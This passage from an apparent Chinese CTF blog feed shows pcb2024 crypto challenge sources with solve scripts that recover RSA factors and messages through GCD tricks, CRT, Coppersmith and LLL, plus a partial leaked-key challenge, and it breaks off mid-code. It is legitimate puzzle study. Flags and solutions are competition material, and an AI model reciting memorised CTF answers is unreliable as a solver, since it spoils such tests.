class="line">0d30000102bc048230010df78648862a090630a604820400050101018202000102a20482238d771399dbbd0001416e7fbd7f589b44151fb0c984549c1c4d948984f85c35934453bfbb4dbb99420f63f9cb8f577a7b60d67bdf84166c500fa7d6c6e484b75d97e308151b31a49c5bd77dd1d2d6711e50d9f5f7bc37d4e2235cfd76a522713c766e240aa2eb5fb45a9015d1dbd6a58b5b28861233ae4eb75a97ced0b78e91024d195adde08f7430b7f160d1d60a4f9d0801db74ebc8c23f9397251faac5500d216acc623e8f6ab212b5e6e9495d5ef6cee995fea98f40b1db2d356dd3c4d2612c64a1295bb23936fad66dc5662cb4ba6a8929591f6b14ce30d67df5ec35edb1f0973f746bcc5fc1ca921ee9660e04c6f286677b92e12b61ba310501030219e5085e5254046204000182020100</span><br><span class="line">中间被打碎了d48d90d80f02818051a5f7e7f4c050a50e18fde12fcee2646f2b43160b0c75ab4925e8269ae80e70cf12734f41fab18d0424ed7cceb7ddb27cbe0f554f7a6e1698d4ec5ba2b48d612e2337aeb75f8a57d8155a11d07b2c49d3d97c4ff0cfb89e6dd4f36cc37c010b5bc89356a39b576cc3edd03cdc4d791df5091a5571df1a6c15eedaa0773cf3cf0281800fc61f05d19c96eec3edcacca34e1d3e2cab439bebab6693a3ce2ca99f88ab9cdd183ceb8e801d8298f835359864ef191db3f53269976ba04b03606e540859decd05805c4aa79dc6db22380658eaf0bffba0f4e719bcf1b1e04169d8e0cb3af4d90b2e62d7c7ed3045d49b525ca715ca3b84f07b4ece27d04d1795299fa186cd02818025c20ab2529f1efd3d35347c573b282abfd95b264c92f6c4f9ec8b7c713206fbea1886880e29a36c47ef9bb753ce9567ea4d3e083c30f344022f95b7cd7114813bf6a28ecc67d5fe05953242684cd29c1c5dd8a74416890e5c943c70904ba70e349b15719a466f901fbf0cfc7840f8032e31afbccfb84f4a817ea51c8f90fd6a2d2d2d2d2d454e442050524956415445204b45592d2d2d2d2d</span><br></pre></td></tr></table></figure><p><code>c</code><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x6f4cb0df50eb133f104727316eb23e25463b6b46a1ff743507c7663094da88a091c77c1d686a91613fa2da697c23924798b40654ba420b9690c5ceb9a362cf48e72c39177c6a3ebecc4e0ba2b9673f070a23e535fff7a01b400381ede60a6f9bf86047b3dd2c663c329b9287749bdb3783303802129b93af083aa2045c500fe0c2a7a018c2403881115927ae56ff14338b9fb98d5a5f461916d962aea7c3379ec7f7d8d77b4cc8ff756895c1500d9f2cee3552f17216339b0d67f27e0dd07e9ec1861f14c962b977559561d709d57e58fd6e6aafd27892c6d43d16b3db267902b9ce8f9ff89a66ab822b5ea3a68c872a32c69961df15581b70c00e4c61804d0d</span><br></pre></td></tr></table></figure></p><p>我以为要手撕证书，去看了一下师兄的<a href="https://tover.xyz/p/pem-by-hand/">这篇</a><br>不行，放弃了，本来就是来看一眼题目的</p><p>以后再补吧(?)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;国城杯&quot;&gt;&lt;a href=&quot;#国城杯&quot; class=&quot;headerlink&quot; title=&quot;国城杯&quot;&gt;&lt;/a&gt;国城杯&lt;/h1&gt;&lt;p&gt;这次比赛的&lt;code&gt;web&lt;/code&gt;比较有难度(题解居然比&lt;code&gt;pwn&lt;/code&gt;少，而且是少很多很多)，交给学弟，然</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>pcb2024-WriteUp</title>
    <link href="https://hvang10.github.io/2024/11/10/pcb2024-WriteUp/"/>
    <id>https://hvang10.github.io/2024/11/10/pcb2024-WriteUp/</id>
    <published>2024-11-10T09:25:26.000Z</published>
    <updated>2025-08-26T09:27:33.731Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="SOLVED"><a href="#SOLVED" class="headerlink" title="SOLVED"></a>SOLVED</h2><h3 id="babyenc-pcb2024"><a href="#babyenc-pcb2024" class="headerlink" title="babyenc-pcb2024"></a>babyenc-pcb2024</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">42</span></span><br><span class="line">flag1 = flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>]</span><br><span class="line">flag2 = flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(flag1.encode())</span><br><span class="line"><span class="built_in">print</span>(flag2.encode())</span><br><span class="line">m1 = bytes_to_long(flag1.encode())</span><br><span class="line">m2 = bytes_to_long(flag2.encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e_gen</span>(<span class="params">bits</span>):</span><br><span class="line">    e = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        e.append(getPrime(bits))</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc1</span>(<span class="params">m, e, shift</span>):</span><br><span class="line">    n = next_prime(m &lt;&lt; shift)</span><br><span class="line">    tmp = getPrime(<span class="number">256</span>)</span><br><span class="line">    cc = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(e)):</span><br><span class="line">        cc.append(<span class="built_in">int</span>(<span class="built_in">pow</span>(tmp, e[i], n)))</span><br><span class="line">    <span class="keyword">return</span> cc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_gen</span>(<span class="params">nbits</span>):</span><br><span class="line">    p = getPrime(nbits)</span><br><span class="line">    q = getPrime(nbits)</span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc2</span>(<span class="params">m, p, q, n</span>):</span><br><span class="line">    c = [<span class="built_in">pow</span>(m, p, n),<span class="built_in">pow</span>(m, q, n)]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">bits = <span class="number">6</span></span><br><span class="line">nbits = <span class="number">1024</span></span><br><span class="line">e = e_gen(bits)</span><br><span class="line">shift = <span class="number">310</span></span><br><span class="line">c1 = enc1(m1,e,shift)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1 =&quot;</span>,c1)</span><br><span class="line">p, q = key_gen(nbits)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">c2 = enc2(m2, p, q, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2 =&quot;</span>,c2)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">e = [43, 37, 53, 61, 59]</span></span><br><span class="line"><span class="string">c1 = [304054249108643319766233669970696347228113825299195899223597844657873869914715629219753150469421333712176994329969288126081851180518874300706117, 300569071066351295347178153438463983525013294497692191767264949606466706307039662858235919677939911290402362961043621463108147721176372907055224, 294806502799305839692215402958402593834563343055375943948669528217549597192296955202812118864208602813754722206211899285974414703769561292993531, 255660645085871679396238463457546909716172735210300668843127008526613931533718130479441396195102817055073131304413673178641069323813780056896835, 194084621856364235027333699558487834531380222896709707444060960982448111129722327145131992393643001072221754440877491070115199839112376948773978]</span></span><br><span class="line"><span class="string">n = 16175064088648626038689748434699435826247716579187475966092822028609536761351820951820375552440329596553448265674841223230257463367834546091974959931391707199002842774795702094681528411058318007858638798643010942408552063479863545047616823056802010158288409527763686086960916160949496083789920012040215745627854092010308869223489833074860062054019221397227691063339148923860987250696934050122115972982286012688955816234717242567815830341836031567275888691320640526306946586793028267588302696611724356566003447616419092371914903382944112125852939011729294400479171568234647164730191643282793224422368321464125847020067</span></span><br><span class="line"><span class="string">c2 = [12053085469218650692076937068797478047679005585690696222988148891925249697123080938461512785257424651119325211991331622346111396522606463631848519999574540677285771456451798811902760319940781754940936484802949729402283626052963389539032949160905330315285409948932070460455535716223838438994608837585387741418172014634472651248450564788332400265295308803291229281839428962457585593065595521459963501453576128172245723315811398209056633738967993602668795794847967331946516181453804430961308142497659799416125763566765485760600358126127595222197324155943818136202233758771243043559460620477085689770403810190118485243364, 13878717704635179949812987989626985689079485417345626168168664941124566737996226347895779823781042724620099437593856913505609774929187720381745418166924229828643565384137488017127800518133460531729559408120123922005898834268035918798610962941606864727966963354615441094676621013036726097763695675723672289505864372820096404707522755617527884121630784469379311199256277022770033036782130954108210409787680433301426480762532000133464370267551845990395683108170721952672388388178378604502610341465223041534665133155077544973384500983410220955683686526835733853985930134970899200234404716865462481142496209914197674463932]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>flag1</code>，我觉得就是<strong>共模攻击</strong>，但是不知<code>n</code>要求<code>n</code>，然后去大佬糖醋小鸡块那里翻了一下(共模攻击)，还真有<br><a href="https://tangcuxiaojikuai.xyz/post/9c1c22d0.html">https://tangcuxiaojikuai.xyz/post/9c1c22d0.html</a>的<strong>Middle_RSA2</strong>，还是需要多构造的</p><p>$c1\equiv m^{e1}mod\ n$<br>$c2\equiv m^{e2}mod\ n$<br>$c1^{-e2}<em>c2^{e1}\equiv 1mod\ n$<br>$c1^{e2}\equiv c2^{e1}mod\ n$<br>$c1^{e2}-c2^{e1}=k</em>n$<br>$GCD求n即可$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e = [<span class="number">43</span>, <span class="number">37</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">59</span>]</span><br><span class="line">c1 = [<span class="number">304054249108643319766233669970696347228113825299195899223597844657873869914715629219753150469421333712176994329969288126081851180518874300706117</span>, <span class="number">300569071066351295347178153438463983525013294497692191767264949606466706307039662858235919677939911290402362961043621463108147721176372907055224</span>,</span><br><span class="line">      <span class="number">294806502799305839692215402958402593834563343055375943948669528217549597192296955202812118864208602813754722206211899285974414703769561292993531</span>, <span class="number">255660645085871679396238463457546909716172735210300668843127008526613931533718130479441396195102817055073131304413673178641069323813780056896835</span>, <span class="number">194084621856364235027333699558487834531380222896709707444060960982448111129722327145131992393643001072221754440877491070115199839112376948773978</span>]</span><br><span class="line">k1_n = c1[<span class="number">0</span>]**e[<span class="number">1</span>]-c1[<span class="number">1</span>]**e[<span class="number">0</span>]</span><br><span class="line">k2_n = c1[<span class="number">1</span>]**e[<span class="number">2</span>]-c1[<span class="number">2</span>]**e[<span class="number">1</span>]</span><br><span class="line">n = GCD(k1_n, k2_n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(n &gt;&gt; <span class="number">310</span>).decode())</span><br><span class="line"><span class="comment"># flag&#123;3e99c26b-efdd-4c</span></span><br></pre></td></tr></table></figure><p><code>flag2</code>，费马小定理化简得到，$c2[0]\equiv m(mod\ p)$，$c2[1]\equiv m(mod\ q)$<br>参考<a href="https://blog.csdn.net/shshss64/article/details/130036481">博客</a></p><p>$方法1：此处不化简$<br>$c2[0]^{n}\equiv c2[1]^{p^{2}}mod\ n$<br>$c2[0]^{n}\equiv c2[1]mod\ p$<br>$p=GCD(pow(c2[0],n,n)-c2[1],n)$<br>$之后中国剩余定理求解m$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line">n = <span class="number">16175064088648626038689748434699435826247716579187475966092822028609536761351820951820375552440329596553448265674841223230257463367834546091974959931391707199002842774795702094681528411058318007858638798643010942408552063479863545047616823056802010158288409527763686086960916160949496083789920012040215745627854092010308869223489833074860062054019221397227691063339148923860987250696934050122115972982286012688955816234717242567815830341836031567275888691320640526306946586793028267588302696611724356566003447616419092371914903382944112125852939011729294400479171568234647164730191643282793224422368321464125847020067</span></span><br><span class="line">c2 = [<span class="number">12053085469218650692076937068797478047679005585690696222988148891925249697123080938461512785257424651119325211991331622346111396522606463631848519999574540677285771456451798811902760319940781754940936484802949729402283626052963389539032949160905330315285409948932070460455535716223838438994608837585387741418172014634472651248450564788332400265295308803291229281839428962457585593065595521459963501453576128172245723315811398209056633738967993602668795794847967331946516181453804430961308142497659799416125763566765485760600358126127595222197324155943818136202233758771243043559460620477085689770403810190118485243364</span>,</span><br><span class="line">      <span class="number">13878717704635179949812987989626985689079485417345626168168664941124566737996226347895779823781042724620099437593856913505609774929187720381745418166924229828643565384137488017127800518133460531729559408120123922005898834268035918798610962941606864727966963354615441094676621013036726097763695675723672289505864372820096404707522755617527884121630784469379311199256277022770033036782130954108210409787680433301426480762532000133464370267551845990395683108170721952672388388178378604502610341465223041534665133155077544973384500983410220955683686526835733853985930134970899200234404716865462481142496209914197674463932</span>]</span><br><span class="line">p = GCD(<span class="built_in">pow</span>(c2[<span class="number">0</span>], n, n)-c2[<span class="number">1</span>], n)</span><br><span class="line">q = n // p</span><br><span class="line">flag = crt([p, q], [c2[<span class="number">0</span>], c2[<span class="number">1</span>]])</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag[<span class="number">0</span>]).decode())</span><br><span class="line"><span class="comment"># d2-bbe5-1420eaaa3b30&#125;</span></span><br></pre></td></tr></table></figure><p>$方法2：此次化简得到$<br>$c2[0]=m+k_{1}p$<br>$c2[1]=m+k_{2}q$<br>$1:\ c2[0]<em>c2[1]=m^{2}+(k_{1}p+k_{2}q)</em>m+k_{1}p<em>k_{2}q$<br>$2:\ m</em>(c2[0]+c2[1])=2<em>m^{2}+(k_{1}p+k_{2}q)</em>m$<br>$1-2:\ m^{2}-m<em>(c2[0]+c2[1])+c2[0]</em>c2[1]\equiv 0(mod\ n)$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">P,Q = [<span class="number">12053085469218650692076937068797478047679005585690696222988148891925249697123080938461512785257424651119325211991331622346111396522606463631848519999574540677285771456451798811902760319940781754940936484802949729402283626052963389539032949160905330315285409948932070460455535716223838438994608837585387741418172014634472651248450564788332400265295308803291229281839428962457585593065595521459963501453576128172245723315811398209056633738967993602668795794847967331946516181453804430961308142497659799416125763566765485760600358126127595222197324155943818136202233758771243043559460620477085689770403810190118485243364</span>, <span class="number">13878717704635179949812987989626985689079485417345626168168664941124566737996226347895779823781042724620099437593856913505609774929187720381745418166924229828643565384137488017127800518133460531729559408120123922005898834268035918798610962941606864727966963354615441094676621013036726097763695675723672289505864372820096404707522755617527884121630784469379311199256277022770033036782130954108210409787680433301426480762532000133464370267551845990395683108170721952672388388178378604502610341465223041534665133155077544973384500983410220955683686526835733853985930134970899200234404716865462481142496209914197674463932</span>]</span><br><span class="line">n = <span class="number">16175064088648626038689748434699435826247716579187475966092822028609536761351820951820375552440329596553448265674841223230257463367834546091974959931391707199002842774795702094681528411058318007858638798643010942408552063479863545047616823056802010158288409527763686086960916160949496083789920012040215745627854092010308869223489833074860062054019221397227691063339148923860987250696934050122115972982286012688955816234717242567815830341836031567275888691320640526306946586793028267588302696611724356566003447616419092371914903382944112125852939011729294400479171568234647164730191643282793224422368321464125847020067</span></span><br><span class="line"></span><br><span class="line">PR.&lt;m&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = m^<span class="number">2</span> - (P+Q)*m + P*Q</span><br><span class="line">x0 = f.small_roots()</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(x0[<span class="number">0</span>])).decode())</span><br><span class="line"><span class="comment"># d2-bbe5-1420eaaa3b30&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ezrsa-pcb2024"><a href="#ezrsa-pcb2024" class="headerlink" title="ezrsa-pcb2024"></a>ezrsa-pcb2024</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad_flag</span>(<span class="params">flag, bits=<span class="number">1024</span></span>):</span><br><span class="line">    pad = os.urandom(bits//<span class="number">8</span> - <span class="built_in">len</span>(flag))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(flag + pad, <span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line">p,q = [getPrime(<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;RSA&quot;</span>[<span class="number">1</span>:]] </span><br><span class="line">a,b = [randint(<span class="number">0</span>, <span class="number">2</span>**<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;RSA&quot;</span>[:-<span class="number">1</span>]] </span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">m = pad_flag(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> m &lt; n</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(p + b * q)</span><br><span class="line"><span class="built_in">print</span>(a * p + q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11850797596095451670524864488046085367812828367468720385501401042627802035427938560866042101544712923470757782908521283827297125349504897418356898752774318846698532487439368216818306352553082800908866174488983776084101115047054799618258909847935672497139557595959270012943240666681053544905262111921321629682394432293381001209674417203517322559283298774214341100975920287314509947562597521988516473281739331823626676843441511662000240327706777269733836703945274332346982187104319993337626265180132608256601473051048047584429295402047392826197446200263357260338332947498385907066370674323324146485465822881995994908925</span></span><br><span class="line"><span class="comment"># 21318014445451076173373282785176305352774631352746325570797607376133429388430074045541507180590869533728841479322829078527002230672051057531691634445544608584952008820389785877589775003311007782211153558201413379523215950193011250189319461422835303446888969202767656215090179505169679429932715040614611462819788222032915253996376941436179412296039698843901058781175173984980266474602529294294210502556931214075073722598225683528873417278644194278806584861250188304944748756498325965302770207316134309941501186831407953950259399116931502886169434888276069750811498361059787371599929532460624327554481179566565183721777</span></span><br><span class="line"><span class="comment"># 4780454330598494796755521994676122817049316484524449315904838558624282970709853419493322324981097593808974378840031638879097938241801612033487018497098140216369858849215655128326752931937595077084912993941304190099338282258345677248403566469008681644014648936628917169410836177868780315684341713654307395687505633335014603359767330561537038768638735748918661640474253502491969012573691915259958624247097465484616897537609020908205710563729989781151998857899164730749018285034659826333237729626543828084565456402192248651439973664388584573568717209037035304656129544659938260424175198672402598017357232325892636389317</span></span><br><span class="line"><span class="comment"># 9819969459625593669601382899520076842920503183309309803192703938113310555315820609668682700395783456748733586303741807720797250273398269491111457242928322099763695038354042594669354762377904219084248848357721789542296806917415858628166620939519882488036571575584114090978113723733730014540463867922496336721404035184980539976055043268531950537390688608145163366927155216880223837210005451630289274909202545128326823263729300705064272989684160839861214962848466991460734691634724996390718260697593087126527364129385260181297994656537605275019190025309958225118922301122440260517901900886521746387796688737094737637604</span></span><br></pre></td></tr></table></figure><p>懂的都懂，原题，上周的强网杯也上了，<a href="https://dexterjie.github.io/2024/11/04/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/">apbq</a>，<a href="https://github.com/defund/ctf/blob/master/angstromctf-2024/blahaj/solve.sage">脚本</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c=<span class="number">11850797596095451670524864488046085367812828367468720385501401042627802035427938560866042101544712923470757782908521283827297125349504897418356898752774318846698532487439368216818306352553082800908866174488983776084101115047054799618258909847935672497139557595959270012943240666681053544905262111921321629682394432293381001209674417203517322559283298774214341100975920287314509947562597521988516473281739331823626676843441511662000240327706777269733836703945274332346982187104319993337626265180132608256601473051048047584429295402047392826197446200263357260338332947498385907066370674323324146485465822881995994908925</span></span><br><span class="line">n=<span class="number">21318014445451076173373282785176305352774631352746325570797607376133429388430074045541507180590869533728841479322829078527002230672051057531691634445544608584952008820389785877589775003311007782211153558201413379523215950193011250189319461422835303446888969202767656215090179505169679429932715040614611462819788222032915253996376941436179412296039698843901058781175173984980266474602529294294210502556931214075073722598225683528873417278644194278806584861250188304944748756498325965302770207316134309941501186831407953950259399116931502886169434888276069750811498361059787371599929532460624327554481179566565183721777</span></span><br><span class="line">y=<span class="number">4780454330598494796755521994676122817049316484524449315904838558624282970709853419493322324981097593808974378840031638879097938241801612033487018497098140216369858849215655128326752931937595077084912993941304190099338282258345677248403566469008681644014648936628917169410836177868780315684341713654307395687505633335014603359767330561537038768638735748918661640474253502491969012573691915259958624247097465484616897537609020908205710563729989781151998857899164730749018285034659826333237729626543828084565456402192248651439973664388584573568717209037035304656129544659938260424175198672402598017357232325892636389317</span></span><br><span class="line">x=<span class="number">9819969459625593669601382899520076842920503183309309803192703938113310555315820609668682700395783456748733586303741807720797250273398269491111457242928322099763695038354042594669354762377904219084248848357721789542296806917415858628166620939519882488036571575584114090978113723733730014540463867922496336721404035184980539976055043268531950537390688608145163366927155216880223837210005451630289274909202545128326823263729300705064272989684160839861214962848466991460734691634724996390718260697593087126527364129385260181297994656537605275019190025309958225118922301122440260517901900886521746387796688737094737637604</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">R = Integers(n)</span><br><span class="line"></span><br><span class="line">P.&lt;a, b, p, q&gt; = PolynomialRing(Integers(n))</span><br><span class="line"></span><br><span class="line">f1 = a*p + q</span><br><span class="line"></span><br><span class="line">f2 = p + b*q</span><br><span class="line"></span><br><span class="line">f3 = p*q</span><br><span class="line"></span><br><span class="line">I = Ideal([f1 - x, f2 - y, f3 - n])</span><br><span class="line">B = I.groebner_basis()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">g = B[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">z = ZZ(g.coefficient(&#123;q: <span class="number">1</span>&#125;))</span><br><span class="line"><span class="keyword">assert</span> g.constant_coefficient() == R(-y)</span><br><span class="line"></span><br><span class="line">_, (z1, _), (z2, _) = <span class="built_in">list</span>(g)</span><br><span class="line">z1 = ZZ(z1)</span><br><span class="line">z2 = ZZ(z2)</span><br><span class="line"></span><br><span class="line">S = <span class="number">2</span>^<span class="number">1024</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p_upper_bits <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    p_upper = p_upper_bits &lt;&lt; <span class="number">1020</span></span><br><span class="line">    <span class="keyword">for</span> q_upper_bits <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        q_upper = q_upper_bits &lt;&lt; <span class="number">1020</span></span><br><span class="line">        M = matrix(ZZ, [[S, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>], [S*z1, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>], [S*(z2 + p_upper + q_upper*z1), <span class="number">0</span>, <span class="number">0</span>, S], [S*n, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]])</span><br><span class="line">        B = M.LLL()</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> B:</span><br><span class="line">            <span class="keyword">if</span> b[-<span class="number">1</span>] == S:</span><br><span class="line">                <span class="keyword">if</span> b[<span class="number">1</span>] &lt; <span class="number">0</span>:</span><br><span class="line">                    b *= -<span class="number">1</span></span><br><span class="line">                p_guess = b[<span class="number">1</span>] + p_upper</span><br><span class="line">                q_guess = b[<span class="number">2</span>] + q_upper</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> p_guess * q_guess == n:</span><br><span class="line">                    d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, (p_guess - <span class="number">1</span>)*(q_guess - <span class="number">1</span>))</span><br><span class="line">                    message = long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(c, d, n)))</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> message:</span><br><span class="line">                        <span class="built_in">print</span>(message)</span><br><span class="line">                        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>奇怪的是，这个<a href="https://connor-mccartney.github.io/cryptography/rsa/BLAHAJ-angstrom-CTF-2024">脚本</a>好像打不出来，上周强网杯是可以的</p><h3 id="Alice’sSecret-pcb2024-after-game"><a href="#Alice’sSecret-pcb2024-after-game" class="headerlink" title="Alice’sSecret-pcb2024(after game)"></a>Alice’sSecret-pcb2024(after game)</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> iv, KEY</span><br><span class="line"></span><br><span class="line"><span class="comment"># I think you will definitely be interested in the content in PNG!</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">=======================================================================================</span></span><br><span class="line"><span class="string">     _      _   _                 _           ____                                _   </span></span><br><span class="line"><span class="string">    / \    | | (_)   ___    ___  ( )  ___    / ___|    ___    ___   _ __    ___  | |_ </span></span><br><span class="line"><span class="string">   / _ \   | | | |  / __|  / _ \ |/  / __|   \___ \   / _ \  / __| | &#x27;__|  / _ \ | __|</span></span><br><span class="line"><span class="string">  / ___ \  | | | | | (__  |  __/     \__ \    ___) | |  __/ | (__  | |    |  __/ | |_ </span></span><br><span class="line"><span class="string"> /_/   \_\ |_| |_|  \___|  \___|     |___/   |____/   \___|  \___| |_|     \___|  \__|</span></span><br><span class="line"><span class="string">                                                                                      </span></span><br><span class="line"><span class="string">=======================================================================================</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> m + (<span class="number">16</span> - (<span class="built_in">len</span>(m) % <span class="number">16</span>)) * <span class="string">b&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pngdata</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;picture.png&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        png_data = f.read()</span><br><span class="line">    <span class="keyword">return</span> pad(png_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_Key</span>(<span class="params">bits</span>):</span><br><span class="line">    p = getPrime(bits)</span><br><span class="line">    g = getPrime(bits // <span class="number">2</span>)</span><br><span class="line">    d = random.randint(<span class="number">1</span>, p - <span class="number">2</span>)</span><br><span class="line">    y = <span class="built_in">pow</span>(g, d, p)</span><br><span class="line">    public, private = (p, g, y), d</span><br><span class="line">    <span class="keyword">return</span> public, private</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Signature</span>(<span class="params">m, public, private</span>):</span><br><span class="line">    m = bytes_to_long(m)</span><br><span class="line">    p, g, _ = public</span><br><span class="line">    d = private</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        k = random.randint(<span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> gmpy2.gcd(k, p - <span class="number">1</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    r = <span class="built_in">pow</span>(g, k, p)</span><br><span class="line">    s = ((m - d * r) * inverse(k, p - <span class="number">1</span>)) % (p - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> (r, s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Verity</span>(<span class="params">m, sign, public</span>):</span><br><span class="line">    m = bytes_to_long(m)</span><br><span class="line">    p, g, y = public</span><br><span class="line">    r, s = sign</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(g, m, p) == (<span class="built_in">pow</span>(y, r, p) * <span class="built_in">pow</span>(r, s, p)) % p:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 